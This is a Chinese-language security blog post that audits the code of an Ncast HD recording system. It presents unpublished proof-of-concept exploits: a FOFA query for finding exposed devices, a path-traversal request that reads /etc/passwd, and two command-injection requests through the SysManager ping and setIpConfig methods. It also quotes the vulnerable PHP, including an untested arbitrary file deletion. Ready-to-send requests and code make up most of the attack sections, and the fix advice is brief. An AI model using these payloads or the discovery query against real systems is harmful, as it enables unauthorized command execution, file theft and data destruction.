#  代码审计-某产品高清智能录播系统漏洞分析附未公开POC   
 实战安全研究   2024-05-05 22:39  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/1mtwZURvGTkCK3ZFyqYEyTwmaLo2YSMeibz3eeShkewiadS4oh0RBl1U7BTVeEscGQrEbjWKcQzGpJEFLwr4cFQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
最近很多小伙伴反馈看不到最新的推文，由于微信公众号推送机制改变了，解决办法：  
  
**给公众号设为星标**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/K98U0WWMOQJq7Hw7iaPuXfEL91oR9qggXiaMF1sCF61fsOVIgrxmtGXPWPLibhWDcUTFOXcianhuz3o9tVIs9Zuq7Q/640?wx_fmt=png&from=appmsg "")  
  
**本文来自团队小伙伴:c3ting**  
  
**博客地址**  
  
**https://c3ting.com**  
  
fofa：  
```
app="Ncast-产品" && title=="高清智能录播系统"
```  
#### 路由：  
  
如：manage-check_Login  
  
即对应访问manage目录下的check_Login文件  
  
路由反射：  
  
路径：/classes/common/busiFacade.php  
```
require_once "gerenal.inc"; // 在gerenal.inc文件中存在自动加载类文件，可用遍历目录下的类文件并加载该文件

$input = urldecode(file_get_contents("php://input"));  //获取POST内容
$jsonObj = json_decode($input); // 解码
$function = getFunctionFromJson($jsonObj); // 动态获取服务对象
$retValue = $function->getFuncMethod()->invokeArgs($function->getServiceObject(), $function->getParameters()); // 调用上面的服务对象的对应的函数方法，并传递了对应的参数

function getFunctionFromJson($jsonObj)
{
  $log = Logger::getLogger("busiFacade");
  $serviceName = $jsonObj->{"serviceName"};
    $funcName = $jsonObj->{"name"};
    $class = null;
    try
    {
      $class = new ReflectionClass($serviceName);
      $functionModel = new FunctionModel();
      $functionModel->setServiceObject($class->newInstance());
      $functionModel->setFuncMethod($class->getmethod($funcName));
      $functionModel->setParameters($jsonObj->{"param"});
      $log->info("class:".$serviceName.",func:".$funcName);
      return $functionModel;
    }
    catch(Exception $e)
    {
      throw $e;
    }
}
```  
  
主要代码如上:首先获取输入值（json对象）然后使用getFunctionFromJson获取到服务对象后调用相应的服务对象中的函数方法并传递对应的参数  
  
如：  
```
{"name":"ping","serviceName":"SysManager","userTransaction":false,"param":["127.0.0.1"]}
```  
  
即为 调用SysManager类中的ping方法 并传递param值，如果使用该反射调用其他类执行漏洞后，生成的文件地址默认会在该地方，详细如下：  
#### 鉴权分析：  
  
该系统中的鉴权文件为：/public/session.php  
  
但是实际中很多都没有使用 到该鉴权文件，直接导致很多目录可用直接使用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/K98U0WWMOQLzrIibBo82pkK9DmnClXpoHib2NDL49S3RbB7OdlVH3fIoXZqAc1cZDgm2plibVbBib7J6xfbdFyoBicg/640?wx_fmt=png&from=appmsg "")  
  
鉴权中 主要判断session中存的时间是否存在和是否到期 但是系统的登录页带游客登录 使用游客登录即可绕过  
#### 漏洞分析：  
##### 1、任意文件下载：  
  
该洞在根目录的 zipConfig.php中发现有引用，深入分析后可得。  
  
漏洞文件位置：developLog/downloadLog.php  
```
GET /developLog/downloadLog.php?name=../../../../etc/passwd HTTP/1.1
Host: xxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=xxxx
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/K98U0WWMOQLzrIibBo82pkK9DmnClXpoHkfAOcpbcibwicc5XnlyLiaJE3vT6hzKvRfdcrCkNLwInxE16WicEjZG4bg/640?wx_fmt=png&from=appmsg "")  
##### 代码分析：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/K98U0WWMOQLzrIibBo82pkK9DmnClXpoH1uKziacvtPIR6VITQWmN3QOVachibnWT8pzJy1wmNGXnB1Xt3KSxhCRw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/K98U0WWMOQLzrIibBo82pkK9DmnClXpoHuVT4svMdsdFiaxL0Qdcuju1FwP79qWKOg3gaa7kQ0FAA9MmbAwL3Bgw/640?wx_fmt=png&from=appmsg "")  
  
该文件中的无授权引入，可直接利用。且只判断文件是否存在，无判断参数**$pathName**中的目录地址是否合法  
  
修复建议：引入鉴权、判断目录是否合法  
##### 2、命令执行  
  
执行位置：/classes/common/busiFacade.php类文件地址：/classes/manage/SysManager.php  
```
POST /classes/common/busiFacade.php HTTP/1.1
Host: xxxx
Content-Length: 130
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=xxxx
Connection: close

%7B%22name%22:%22ping%22,%22serviceName%22:%22SysManager%22,%22userTransaction%22:false,%22param%22:%5B%22127.0.0.1%7Cpwd%22%5D%7D
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/K98U0WWMOQLzrIibBo82pkK9DmnClXpoH5YSYDYm2ExROFA8ZDubsRXgSEUEhWDwG8mBA2iaACfV00icYwORsQ0VA/640?wx_fmt=png&from=appmsg "")  
  
代码分析：  
```
public function ping($ip)
{
  try 
  {
    $ret = shell_exec("ping -c4 $ip");
    $this->log->info($ret);
    return $ret; 
  } 
  catch (Exception $e) 
  {
    $this->log->error($e->getMessage(), $e);
    throw $e;
  }
}
```  
  
通过入口反射调用了SysManager类中的ping方法在ping方法中 无过滤传进来的**$ip**参数直接拼接shell指令并执行执行，并将执行后的输出返回到前端  
  
修复建议：在使用shell_exec、exec、eval这类危险函数时 必须严格过滤用户的输入可使用正则等方式判断输入是否合法  
##### 3、命令执行：  
  
执行位置：/classes/common/busiFacade.php类文件地址：/classes/manage/SysManager.php  
```
POST /classes/common/busiFacade.php HTTP/1.1
Host: xxxxxxx
Content-Length: 261
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=xxxxx
Connection: close

%7B%22name%22%3A%22setIpConfig%22%2C%22serviceName%22%3A%22SysManager%22%2C%22userTransaction%22%3Afalse%2C%22param%22%3A%5B%22%3Bpwd%3E%3E1.txt%22%2C%22255.255.252.0%22%2C%22192.168.7.1%22%2C%22202.96.128.86%22%2C%22192.168.89.89%22%2C%22255.255.252.0%22%5D%7D
```  
  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/K98U0WWMOQLzrIibBo82pkK9DmnClXpoH4QJjyEsO2GEhTAWSwWbiaXKvJLOMTgR5xLDaRf4tKFiazONXZAOtFXgQ/640?wx_fmt=png&from=appmsg "")  
  
##### 代码分析：  
```
public function setIpConfig($ip, $mask, $gateway, $dns, $ip2, $mask2)
{
  $cmd = "/ncast/shell/saveIP.sh $ip $mask $gateway $dns $ip2 $mask2";
  try 
  {
    $this->log->info($cmd);
    exec($cmd);
  } 
  catch (Exception $e) 
  {
    $this->log->error($e->getMessage(), $e);
    throw $e;
  }
}
```  
  
该rce也是通过入口反射文件执行到SysManager类中的setIpConfig函数中该函数中 无过滤用户输入 直接拼接shell指令并使用exec执行，欲想生成文件 在无指定地址的情况下 默认会在入口反射文件同目录下生成。  
  
修复建议：鉴权、判断用户输入的合法性  
##### 4、任意文件删除（未测试）  
  
入口位置：developLog/check_develop.php  
```
$obj = $_REQUEST;
function deleteDevLog($obj){
  $logger = Logger::getLogger("deleteDevLog");
  $pathNames = $obj['pathNames'];
  try{
    if(count($pathNames) < 0 || $pathNames == null)
      return ;
    foreach($pathNames as $pathName){
      if(file_exists($pathName))
        unlink($pathName);
      $logger->info("删除日志：".$pathName);
    }
  }catch (Exception $e){
    $logger->error($e->getMessage(), $e);
    throw $e;
  }  
}
$type = $obj['type'];
if("del" == $type){
  deleteDevLog($obj);
}else{
  qryDevelopLog($obj);
}
```  
  
该漏洞未测试 但通过静态分析看出 确实存在该漏洞  
  
该文件中 传入**type**值为**del**后即可触发**deleteDevLog**函数  
  
在**deleteDevLog**函数中 遍历参数中**pathNames**的值并判断 该文件是否存在 如果存在即调用unlink方法直接删除  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBDEU5hJAFfap4mBBAnI4BIic2GAuYgDwUzqwIb9wicGiaCyopAyJEKapgA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
**点分享**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBRJ4tRlk9QKMxMAMticVia5ia8bcewCtM3W67zSrFPyjHuSKmeESESE1Ig/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
**点收藏**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBnTO2pb7hEqNd7bAykePEibP0Xw7mJTJ7JnFkHuQR9vHE7tNJyHIibodA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
**点点赞**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaWs5g9QGias3uHL9Uf0LibiaBhibuWXia5pNqBfUReATI6GO6sYibzMvj8ibQM6rOo2ULshCrbaM0mJYEqw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
**点在看**  
  
  
